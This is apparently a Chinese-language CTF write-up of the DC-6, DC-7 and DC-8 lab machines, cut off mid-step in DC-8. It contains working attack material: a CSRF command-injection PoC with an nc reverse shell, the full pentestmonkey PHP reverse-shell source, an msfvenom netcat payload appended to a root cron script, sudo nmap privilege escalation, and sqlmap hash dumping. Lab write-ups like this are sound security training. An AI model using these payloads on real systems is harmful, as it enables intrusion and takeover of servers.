888 Y8888 888 Y88b. Y8b. Y88b 888 d88P Y88..88P 888 888 &quot;88b &quot; &quot; &quot; 888 Y888 888 &quot;Y8888P &quot;Y8888 &quot;Y8888888P&quot; &quot;Y88P&quot; 888 888 888 888 888 888 Once again, a big thanks to all those who do these little challenges, and especially all those who give me feedback - again, it&#39;s all greatly appreciated. :-) I also want to send a big thanks to all those who find the vulnerabilities and create the exploits that make these challenges possible. # DC-6环境虚拟机平台：VMware Workstation Pro 攻击机：Kali（IP：192.168.199.133） 靶机：DC-6（IP：192.168.199.107） 渗透测试nmap扫描IP，开放22和80端口，但是访问80却发现解析不了，仔细一看，又是重定向问题 root@Knlvre:/~# nmap -p- -A 192.168.199.107 Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-25 17:54 CST Nmap scan report for dc-6.lan (192.168.199.107) Host is up (0.00081s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA) | 256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA) |_ 256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Did not follow redirect to http://wordy/ |_https-redirect: ERROR: Script execution failed (use -d to debug) MAC Address: 00:0C:29:D5:AC:59 (VMware) Device type: general purpose Running: Linux 3.X|4.X ... ... 继续修改hosts，添加如下记录 192.168.199.107 wordy 添加完之后重新访问就可以了，又是WordPress。继续用wpscan扫描用户 root@Knlvre:/~# wpscan --url http://wordy/ -e u ... ... [i] User(s) Identified: [+] admin | Detected By: Rss Generator (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] sarah | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [+] graham | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [+] mark | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) [+] jens | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) ... ... cewl抓关键词 root@Knlvre:/~# cewl http://wordy -w passwords_dc6.txt CeWL 5.4.6 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/) wpscan爆破用户名密码 root@Knlvre:/~# wpscan --url http://wordy/ -U users_dc6.txt -P passwords_dc6.txt 不是很顺利，爆破没有结果。想要用rockyou.txt爆破，但是记录是在太多了，猴年马月才能爆破完，所以这个时候，官网给了提示 OK, this isn’t really a clue as such, but more of some “we don’t want to spend five years waiting for a certain process to finish” kind of advice for those who just want to get on with the job. cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt That should save you a few years. ;-) 就按照提示生成密码文本 root@Knlvre:/~# cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords_dc6.txt root@Knlvre:/~# wc -l passwords_dc6.txt 2668 passwords_dc6 然后再次爆破 root@Knlvre:/~# wpscan --url http://wordy/ -U users_dc6 -P passwords_dc6 ... ... [i] No Config Backups Found. [+] Performing password attack on Xmlrpc against 5 user/s [SUCCESS] - mark / helpdesk01 ... ... 用户名：mark 密码：helpdesk01 进入后台之后没有发现，继续按照之前的方法去尝试ssh，看mark会不会重复使用这个密码，但是无果 root@Knlvre:~# ssh mark@192.168.199.107 The authenticity of host &#39;192.168.199.107 (192.168.199.107)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:jlerdCouZvnDhR/1oNiOrfqqzChsDT0gm8uG96kRY2U. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;192.168.199.107&#39; (ECDSA) to the list of known hosts. mark@192.168.199.107&#39;s password: Permission denied, please try again. 继续回到网页，然后发现了网页中的一款插件Activity monitor searchsploit搜索关键词wordpress activity monitor root@Knlvre:/~# searchsploit wordpress activity monitor ------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) ------------------------------------------- ---------------------------------------- WordPress Plugin Plainview ... | exploits/php/webapps/45274.html ------------------------------------------- ---------------------------------------- Shellcodes: No Result root@Knlvre:/~# searchsploit -m exploits/php/webapps/45274.html Exploit: WordPress Plugin Plainview Activity Monitor 20161228 - (Authenticated) Command Injection URL: https://www.exploit-db.com/exploits/45274 Path: /usr/share/exploitdb/exploits/php/webapps/45274.html File Type: HTML document, ASCII text, with CRLF line terminators Copied to: /var/www/html/45274.html 查看45274.html root@Knlvre:/~# cat 45274.html &lt;!-- About: =========== Component: Plainview Activity Monitor (Wordpress plugin) Vulnerable version: 20161228 and possibly prior Fixed version: 20180826 CVE-ID: CVE-2018-15877 CWE-ID: CWE-78 Author: - LydA(c)ric Lefebvre (https://www.linkedin.com/in/lydericlefebvre) Timeline: =========== - 2018/08/25: Vulnerability found - 2018/08/25: CVE-ID request - 2018/08/26: Reported to developer - 2018/08/26: Fixed version - 2018/08/26: Advisory published on GitHub - 2018/08/26: Advisory sent to bugtraq mailing list Description: =========== Plainview Activity Monitor Wordpress plugin is vulnerable to OS command injection which allows an attacker to remotely execute commands on underlying system. Application passes unsafe user supplied data to ip parameter into activities_overview.php. Privileges are required in order to exploit this vulnerability, but this plugin version is also vulnerable to CSRF attack and Reflected XSS. Combined, these three vulnerabilities can lead to Remote Command Execution just with an admin click on a malicious link. References: =========== https://github.com/aas-n/CVE/blob/master/CVE-2018-15877/ PoC: --&gt; &lt;html&gt; &lt;!-- Wordpress Plainview Activity Monitor RCE [+] Version: 20161228 and possibly prior [+] Description: Combine OS Commanding and CSRF to get reverse shell [+] Author: LydA(c)ric LEFEBVRE [+] CVE-ID: CVE-2018-15877 [+] Usage: Replace 127.0.0.1 &amp; 9999 with you ip and port to get reverse shell [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well --&gt; &lt;body&gt; &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt; &lt;form action=&quot;http://localhost:8000/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;ip&quot; value=&quot;google.fr| nc -nlvp 127.0.0.1 9999 -e /bin/bash&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;lookup&quot; value=&quot;Lookup&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 根据提示，我们修改部分内容： ... &lt;body&gt; &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt; &lt;form action=&quot;http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;ip&quot; value=&quot;google.fr| nc -e /bin/bash 192.168.199.133 3737&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;lookup&quot; value=&quot;Lookup&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; ... 然后现在攻击机这段开启端口监听 root@Knlvre:~# nc -lvnp 3737 listening on [any] 3737 ... 再去访问http://127.0.0.1/45274.html，点击Submit request 就这样返回了shell root@Knlvre:~# nc -lvnp 3737 listening on [any] 3737 ... connect to [192.168.199.133] from (UNKNOWN) [192.168.199.107] 53980 python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; www-data@dc-6:/var/www/html/wp-admin$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) 将提权工具LinEnum上传到靶机，检测后无利用点。查看/home目录，发现有4个目录，一一查看之后发现两个文件：①/home/mark/stuff目录下的things-to-do.txt，②/home/mark/stuff目录下的bakups.sh。查看第一个文件，提示如下 Things to do: Restore full functionality for the hyperdrive (need to speak to Jens) Buy present for Sarah’s farewell party Add new user: graham - GSo7isUM1D4 - done Apply for the OSCP course Buy new laptop for Sarah’s replacement 查看第二个文件 www-data@dc-6:/home/jens$ cat backups.sh #!/bin/bash tar -czf backups.tar.gz /var/www/html 提示中的用户名密码会不会是ssh？尝试一下，果然是 root@Knlvre:/~# ssh graham@192.168.43.22 ... Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. graham@dc-6:~$ id uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs) sudo -l后出现提示 graham@dc-6:~$ sudo -l Matching Defaults entries for graham on dc-6: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User graham may run the following commands on dc-6: (jens) NOPASSWD: /home/jens/backups.sh User graham may run the following commands on dc-6: (jens) NOPASSWD: /home/jens/backups.sh 按照提示尝试运行backups.sh文件，就能不输入密码成为jens。首先，在文件中写入/bin/sh graham@dc-6:/home/jens$ echo &quot;/bin/sh&quot; &gt; backups.sh graham@dc-6:/home/jens$ cat backups.sh /bin/sh graham@dc-6:/home/jens$ sudo -u jens ./backups.sh $ id uid=1004(jens) gid=1004(jens) groups=1004(jens),1005(devs) $ python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; jens@dc-6:~$ 继续查看权限，出现提示 jens@dc-6:~$ sudo -l Matching Defaults entries for jens on dc-6: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jens may run the following commands on dc-6: (root) NOPASSWD: /usr/bin/nmap User jens may run the following commands on dc-6: (root) NOPASSWD: /usr/bin/nmap 提示可以使用nmap提权，低版本(2.02-5.21)可以直接提权 jens@dc-6:~$ sudo nmap nmap --interactive+ !sh # 高版本需要插件提权 jens@dc-6:~$ echo &#39;os.execute(&quot;/bin/sh&quot;)&#39; &gt; TE.nse jens@dc-6:~$ sudo nmap --script=/home/jens/TE.nse Starting Nmap 7.40 ( https://nmap.org ) at 2019-09-26 11:25 AEST # python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; #执行但没有回显 root@dc-6:/home/jens# id uid=0(root) gid=0(root) groups=0(root) 查找并查看flag root@dc-6:/home/jens# find / -name *flag* ... /root/theflag.txt root@dc-6:/home/jens# cat /root/theflag.txt Yb dP 888888 88 88 8888b. dP&quot;Yb 88b 88 888888 d8b Yb db dP 88__ 88 88 8I Yb dP Yb 88Yb88 88__ Y8P YbdPYbdP 88&quot;&quot; 88 .o 88 .o 8I dY Yb dP 88 Y88 88&quot;&quot; `&quot;&#39; YP YP 888888 88ood8 88ood8 8888Y&quot; YbodP 88 Y8 888888 (8) Congratulations!!! Hope you enjoyed DC-6. Just wanted to send a big thanks out there to all those who have provided feedback, and who have taken time to complete these little challenges. If you enjoyed this CTF, send me a tweet via @DCAU7. DC-7环境虚拟机平台：VMware Workstation Pro 攻击机：Kali（IP：192.168.43.84） 靶机：DC-7（IP：192.168.43.29） 渗透测试nmap扫描IP，开放22和80端口 root@Knlvre:~# nmap -p- -A 192.168.43.29 Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-27 09:36 CST Nmap scan report for bogon (192.168.43.29) Host is up (0.0035s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 d0:02:e9:c7:5d:95:32:ab:10:99:89:84:34:3d:1e:f9 (RSA) | 256 d0:d6:40:35:a7:34:a9:0a:79:34:ee:a9:6a:dd:f4:8f (ECDSA) |_ 256 a8:55:d5:76:93:ed:4f:6f:f1:f7:a1:84:2f:af:bb:e1 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-generator: Drupal 8 (https://www.drupal.org) | http-robots.txt: 22 disallowed entries (15 shown) | /core/ /profiles/ /README.txt /web.config /admin/ | /comment/reply/ /filter/tips /node/add/ /search/ /user/register/ | /user/password/ /user/login/ /user/logout/ /index.php/admin/ |_/index.php/comment/reply/ |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Welcome to DC-7 | D7 MAC Address: 00:0C:29:BB:F1:42 (VMware) Device type: general purpose 访问80端口，发现是Drupal框架。第一时间想到MSF，搜索drupal，利用了几个最新的模块后都没能成功拿到shell。回到网页看提示 Welcome to DC-7 DC-7 introduces some “new” concepts, but I’ll leave you to figure out what they are. :-) While this challenge isn’t all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won’t succeed. What you will have to do, is to think “outside” the box. Way “outside” the box. :-) 注意到这里的提示outside和底部的DC7USER，这里需要推特搜索这个用户，然后发现这个账户有一个链接：https:/github.com/Dc7User，我没有注册，所以直接用别人的图 打开这个连接之后，看到后看到一个叫stuffdb的php仓库 进入之后出现了提示 This is some “code” (yes, it’s not the greatest code, but that wasn’t the point) for the DC-7 challenge. This isn’t a flag, btw, but if you have made it here, well done anyway. :-) 打开login.php没有发现账号密码，但是include了config.php，去查看看到了账号密码 &lt;?php $servername = &quot;localhost&quot;; $username = &quot;dc7user&quot;; $password = &quot;MdR3xOgB7#dW&quot;; $dbname = &quot;Staff&quot;; $conn = mysqli_connect($servername, $username, $password, $dbname); ?&gt; 拿到上面的账号密码之后，想到刚才扫描端口有看到开放22号端口，直接拿去连接，果然成功 fingerprint is SHA256:J5aG8w2iY0G0Nh3p4L+WzXXaQ7O1GjFTlfAYwkBIbM4. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;192.168.43.29&#39; (ECDSA) to the list of known hosts. dc7user@192.168.43.29&#39;s password: Linux dc-7 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64 ... dc7user@dc-7:~$ id uid=1000(dc7user) gid=1000(dc7user) groups=1000(dc7user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev) 查看当前目录，发现了邮箱记录mbox，查看 dc7user@dc-7:~$ ls backups mbox dc7user@dc-7:~$ cat mbox ... From root@dc-7 Fri Aug 30 03:15:17 2019 Return-path: &lt;root@dc-7&gt; Envelope-to: root@dc-7 Delivery-date: Fri, 30 Aug 2019 03:15:17 +1000 Received: from root by dc-7 with local (Exim 4.89) (envelope-from &lt;root@dc-7&gt;) id 1i3O0y-0000Ed-To for root@dc-7; Fri, 30 Aug 2019 03:15:17 +1000 From: root@dc-7 (Cron Daemon) To: root@dc-7 Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh MIME-Version: 1.0 Content-Type: text/plain; charset=UTF-8 Content-Transfer-Encoding: 8bit X-Cron-Env: &lt;PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin&gt; X-Cron-Env: &lt;SHELL=/bin/sh&gt; X-Cron-Env: &lt;HOME=/root&gt; X-Cron-Env: &lt;LOGNAME=root&gt; Message-Id: &lt;E1i3O0y-0000Ed-To@dc-7&gt; Date: Fri, 30 Aug 2019 03:15:17 +1000 rm: cannot remove &#39;/home/dc7user/backups/*&#39;: No such file or directory Database dump saved to /home/dc7user/backups/website.sql [success] ... 刚开始关注到这个backups/website.sql，查看之后发现是gpg加密文件，就先不去看。再次关注到邮件的Subject: Cron &lt;root@dc-7&gt; /opt/scripts/backups.sh，查看该文件 dc7user@dc-7:/opt/scripts$ cat backups.sh #!/bin/bash rm /home/dc7user/backups/* cd /var/www/html/ drush sql-dump --result-file=/home/dc7user/backups/website.sql cd .. tar -czf /home/dc7user/backups/website.tar.gz html/ gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz chown dc7user:dc7user /home/dc7user/backups/* rm /home/dc7user/backups/website.sql rm /home/dc7user/backups/website.tar.gz 关注到这个drush命令，是drupal框架中用来做一些配置的命令，它可以改变用户名密码，格式如下： drush user-password admin --password=&quot;new_pass&quot; 切换到/var/www/html下，用drush试着改变admin的密码，修改成功 dc7user@dc-7:/opt/scripts$ cd /var/www/html dc7user@dc-7:/var/www/html$ drush user-password admin --password=&quot;123456&quot; Changed password for admin 回到浏览器，用admin登录，成功 进来后Manage -&gt; Extend -&gt; List -&gt; Install new module，进入安装新插件的页面 从下面的网页中下载插件php-8.x-1.0.tar.gz，然后点击Install上传到靶机上 https://www.drupal.org/project/php 上传成功页面中，点击Enable newly added modules，前往激活插件 点开FILTERS选项卡，勾选PHP Filter，然后点击下方的Install 现在回到主页，点击在左边的Tools栏中点击Add content -&gt; Basic page 在Body栏内写入一个反向shell &lt;?php // php-reverse-shell - A Reverse Shell implementation in PHP // Copyright (C) 2007 pentestmonkey@pentestmonkey.net // // This tool may be used for legal purposes only. Users take full responsibility // for any actions performed using this tool. The author accepts no liability // for damage caused by this tool. If these terms are not acceptable to you, then // do not use this tool. // // In all other respects the GPL version 2 applies: // // This program is free software; you can redistribute it and/or modify // it under the terms of the GNU General Public License version 2 as // published by the Free Software Foundation. // // This program is distributed in the hope that it will be useful, // but WITHOUT ANY WARRANTY; without even the implied warranty of // MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the // GNU General Public License for more details. // // You should have received a copy of the GNU General Public License along // with this program; if not, write to the Free Software Foundation, Inc., // 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. // // This tool may be used for legal purposes only. Users take full responsibility // for any actions performed using this tool. If these terms are not acceptable to // you, then do not use this tool. // // You are encouraged to send comments, improvements or suggestions to // me at pentestmonkey@pentestmonkey.net // // Description // ----------- // This script will make an outbound TCP connection to a hardcoded IP and port. // The recipient will be given a shell running as the current user (apache normally). // // Limitations // ----------- // proc_open and stream_set_blocking require PHP version 4.3+, or 5+ // Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows. // Some compile-time options are needed for daemonisation (like pcntl, posix). These are rarely available. // // Usage // ----- // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck. set_time_limit (0); $VERSION = &quot;1.0&quot;; $ip = &#39;192.168.43.84&#39;; // CHANGE THIS $port = 3737; // CHANGE THIS $chunk_size = 1400; $write_a = null; $error_a = null; $shell = &#39;uname -a; w; id; /bin/sh -i&#39;; $daemon = 0; $debug = 0; // // Daemonise ourself if possible to avoid zombies later // // pcntl_fork is hardly ever available, but will allow us to daemonise // our php process and avoid zombies. Worth a try... if (function_exists(&#39;pcntl_fork&#39;)) { // Fork and have the parent process exit $pid = pcntl_fork(); if ($pid == -1) { printit(&quot;ERROR: Can&#39;t fork&quot;); exit(1); } if ($pid) { exit(0); // Parent exits } // Make the current process a session leader // Will only succeed if we forked if (posix_setsid() == -1) { printit(&quot;Error: Can&#39;t setsid()&quot;); exit(1); } $daemon = 1; } else { printit(&quot;WARNING: Failed to daemonise. This is quite common and not fatal.&quot;); } // Change to a safe directory chdir(&quot;/&quot;); // Remove any umask we inherited umask(0); // // Do the reverse shell... // // Open reverse connection $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(&quot;$errstr ($errno)&quot;); exit(1); } // Spawn shell process $descriptorspec = array( 0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;), // stdin is a pipe that the child will read from 1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;), // stdout is a pipe that the child will write to 2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;) // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(&quot;ERROR: Can&#39;t spawn shell&quot;); exit(1); } // Set everything to non-blocking // Reason: Occsionally reads will block, even though stream_select tells us they won&#39;t stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(&quot;Successfully opened reverse shell to $ip:$port&quot;); while (1) { // Check for end of TCP connection if (feof($sock)) { printit(&quot;ERROR: Shell connection terminated&quot;); break; } // Check for end of STDOUT if (feof($pipes[1])) { printit(&quot;ERROR: Shell process terminated&quot;); break; } // Wait until a command is end down $sock, or some // command output is available on STDOUT or STDERR $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); // If we can read from the TCP socket, send // data to process&#39;s STDIN if (in_array($sock, $read_a)) { if ($debug) printit(&quot;SOCK READ&quot;); $input = fread($sock, $chunk_size); if ($debug) printit(&quot;SOCK: $input&quot;); fwrite($pipes[0], $input); } // If we can read from the process&#39;s STDOUT // send data down tcp connection if (in_array($pipes[1], $read_a)) { if ($debug) printit(&quot;STDOUT READ&quot;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(&quot;STDOUT: $input&quot;); fwrite($sock, $input); } // If we can read from the process&#39;s STDERR // send data down tcp connection if (in_array($pipes[2], $read_a)) { if ($debug) printit(&quot;STDERR READ&quot;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(&quot;STDERR: $input&quot;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); // Like print, but does nothing if we&#39;ve daemonised ourself // (I can&#39;t figure out how to redirect STDOUT like a proper daemon) function printit ($string) { if (!$daemon) { print &quot;$string\\n&quot;; } } ?&gt; 现在本地打开监听，然后点击Preview，成功拿到shell root@Knlvre:~# nc -lvnp 3737 listening on [any] 3737 ... connect to [192.168.43.84] from (UNKNOWN) [192.168.43.29] 60104 Linux dc-7 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64 GNU/Linux 13:28:32 up 2:52, 1 user, load average: 0.01, 0.06, 0.03 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT dc7user pts/0 192.168.43.84 12:33 34:56 0.25s 0.25s -bash uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can&#39;t access tty; job control turned off $ python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; www-data@dc-7:/$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) 在确认无其他可利用信息之后，查看最初的backups.sh的权限 www-data@dc-7:/opt/scripts$ ls -l -rwxrwxr-x 1 root www-data 520 Aug 29 23:02 backups.sh 文件拥有者为root，而root用户在www-data组内，说明我们当前的www-data用户拥有对该文件的所有权限（r、w、x） 现在就可以滥用&quot;写&quot;权限来完成提权，借助工具msfvenom，Kali端输入如下命令 msfvenom -p cmd/unix/reverse_netcat lhost=192.168.43.84 lport=7373 R 等待一段时间之后，msfvenom就会返回一段命令 root@Knlvre:~# msfvenom -p cmd/unix/reverse_netcat lhost=192.168.43.84 lport=7373 [-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload [-] No arch selected, selecting arch: cmd from the payload No encoder or badchars specified, outputting raw payload Payload size: 91 bytes mkfifo /tmp/bqro; nc 192.168.43.84 7373 0&lt;/tmp/bqro | /bin/sh &gt;/tmp/bqro 2&gt;&amp;1; rm /tmp/bqro nc监听7373端口 root@Knlvre:~# nc -lvnp 7373 listening on [any] 7373 ... 然后复制刚才msfvenom返回的最后一行，加上引号，前面加echo，后面加&gt;&gt; backups.sh。然后在刚才拿到的靶机的shell中执行如下命令，然后什么都不用做了，等待连接就行 echo &quot;mkfifo /tmp/bqro; nc 192.168.43.84 7373 0&lt;/tmp/bqro | /bin/sh &gt;/tmp/bqro 2&gt;&amp;1; rm /tmp/bqro&quot; &gt;&gt; backups.sh 马上返回了root的shell，拿下flag root@Knlvre:~# nc -lvnp 7373 listening on [any] 7373 ... connect to [192.168.43.84] from (UNKNOWN) [192.168.43.29] 55244 id uid=0(root) gid=0(root) groups=0(root) cd /root ls theflag.txt cat theflag.txt 888 888 888 888 8888888b. 888 888 888 888 888 o 888 888 888 888 &quot;Y88b 888 888 888 888 888 d8b 888 888 888 888 888 888 888 888 888 888 d888b 888 .d88b. 888 888 888 888 .d88b. 88888b. .d88b. 888 888 888 888 888d88888b888 d8P Y8b 888 888 888 888 d88&quot;&quot;88b 888 &quot;88b d8P Y8b 888 888 888 888 88888P Y88888 88888888 888 888 888 888 888 888 888 888 88888888 Y8P Y8P Y8P Y8P 8888P Y8888 Y8b. 888 888 888 .d88P Y88..88P 888 888 Y8b. &quot; &quot; &quot; &quot; 888P Y888 &quot;Y8888 888 888 8888888P&quot; &quot;Y88P&quot; 888 888 &quot;Y8888 888 888 888 888 Congratulations!!! Hope you enjoyed DC-7. Just wanted to send a big thanks out there to all those who have provided feedback, and all those who have taken the time to complete these little challenges. I&#39;m sending out an especially big thanks to: @4nqr34z @D4mianWayne @0xmzfr @theart42 If you enjoyed this CTF, send me a tweet via @DCAU7. DC-8环境虚拟机平台：VMware Workstation Pro 攻击机：Kali（IP：192.168.43.84或192.168.0.111） 靶机：DC-8（IP：192.168.43.165或192.168.0.112） 渗透测试nmap扫描IP，开放22和80端口，访问80端口，还是drupal框架 在点击左侧Details栏时，发现URL中的nid在改变 添加单引号后报错，直接给执行的语句，发现是整形注入 sqlmap跑，直接跑出了数据库 sqlmap -u http://192.168.43.165/?nid=1 --dbs --batch d7dbinformation_schema sqlmap -u http://192.168.43.165/?nid=1 -D d7db --tables --batch … users users_roles … 选择users表，爆出admin的密码 sqlmap -u http://192.168.43.165/?nid=1 -D d7db -T users --dump --batch uid name pass 1 admin $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z 2 john $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF john爆破密码（admin的没有出来，john的出来了） # vi password_dc8.txt # 填入$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF # john password_dc8.txt root@Knlvre:~# vi password_dc8.txt root@Knlvre:~# john password_dc8.txt Using default input encoding: UTF-8 Loaded 1 password hash (Drupal7, $S$ [SHA512 256/256 AVX2 4x]) Cost 1 (iteration count) is 32768 for all loaded hashes Proceeding with single, rules:Single Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist turtle (?) 1g 0:00:00:11 DONE 2/3 (2019-09-27 16:09) 0.08912g/s 99.10p/s 99.10c/s 99.10C/s tucker..utopia Use the &quot;--show&quot; option to display all of the cracked passwords reliably Session completed dirsearch扫描登录目录，扫到/user，登录john的账号成功。点击上面的Contact Us，切换界面后点击Webform -&gt; form settings，选择PHP code，然后填入之前用的reverse shell（注意：在shell前面加上任意字符串，然后记得修改地址和端口），点击提交 先开启监听 root@Knlvre:~# nc -lvnp 3737 listening on [any] 3737 ... 然后回到Contact us主页面，随意填写基本内容，然后提交 再次回到Terminal，就拿到了shell。查找具有SUID权限的文件 $ python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; www-data@dc-8:/$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@dc-8:/$ find / -perm -4000 2&gt;/dev/null find / -perm -4000 2&gt;/dev/null /usr/bin/chfn /usr/bin/gpasswd /usr/bin/chsh /usr/bin/passwd /usr/bin/sudo /usr/bin/newgrp /usr/sbin/exim4 /usr/lib/openssh/ssh-keysign /usr/lib/eject/dmcrypt-get-device /usr/lib/dbus-1.0/dbus-daemon-launch-helper /bin/ping /bin/su /bin/umount /bin/mount 注意这个exim4，利用它来提权，查看版本 www-data@dc-8:/$ exim4 --version | head -1 Exim version 4.89 #2 built 14-Jun-2017 05:03:07 在Exploit Database里搜索exim，利用这篇：https://www.exploit-db.com/exploits/46996 由于www-data用户在当前目录下无写权限，所以切换到/tmp目录下，因为有写权限 www-data@dc-8:/$ ls -l ... drwxr-xr-x 2 root root 4096 Sep 5 00:23 srv dr-xr-xr-x 13 root root 0 Sep 30 01:45 sys drwxrwxrwt 2 root root 4096 Oct 1 07:42 tmp drwxr-xr-x 10 root root 4096 Sep 5 00:23 usr drwxr-xr-x 12 root root 4096 Sep 5 00:32 var ... 可以直接wget刚才的地址，也可以下载到Kali上，然后开启临时Web服务下载到靶机上，但是当我./执行时一直报错： www-data@dc-8:/tmp$ wget http://192.168.0.111:7373/46996.sh --2019-10-01 08:16:21-- http://192.168.0.111:7373/46996.sh Connecting to 192.168.0.111:7373... connected. HTTP request sent, awaiting response... 200 OK Length: 3706 (3.6K) [text/x-sh] Saving to: &#39;46996.sh&#39; 46996.sh 100%[===================&gt;] 3.62K --.-KB/s in 0s 2019-10-01 08:16:21 (28.9 MB/s) - &#39;46996.sh&#39; saved [3706/3706] www-data@dc-8:/tmp$ ls 46996.sh www-data@dc-8:/tmp$ chmod 777 46996.sh www-data@dc-8:/tmp$ ./46996.sh bash: ./46996.sh: /bin/bash^M: bad interpreter: No such file or directory 所以只能直接用vi命令直接写：点击如下图位置，复制弹出的内容，然后直接在靶机中新建文件，写入其中 www-data@dc-8:/tmp$ ls raptor_exim_wiz.sh www-data@dc-8:/tmp$ vi raptor_exim_wiz.sh #写入 www-data@dc-8:/tmp$ ls raptor_exim_wiz.sh www-data@dc-8:/tmp$ chmod 777 raptor_exim_wiz.sh 按照文档内的Usage，有两种方法来执行该文件 # Usage (setuid method): # $ id # uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) 